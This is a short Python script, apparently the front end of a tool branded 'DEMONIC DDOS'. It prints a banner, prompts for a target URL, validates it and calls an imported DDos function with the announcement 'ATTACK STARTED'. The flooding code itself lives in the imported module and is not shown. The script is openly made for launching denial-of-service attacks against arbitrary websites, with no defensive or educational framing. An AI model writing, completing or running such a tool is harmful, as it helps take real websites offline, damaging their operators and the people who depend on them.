#!/usr/bin/python3
import os,sys,time
from DDos import checkUrl,DDos
from cfonts import render,say
logo = render('DEMONIC DDOS',colors=["White","black"],align="center")

os.system("clear")
print(logo)
print("_"*55)

while True:
    url = input("Enter Url :")
    if checkUrl(url):
        break
    else:
        print("Url isn't formented correctly.")

print("ATTACK STARTED CTRL + C to STOP")
DDos(url)
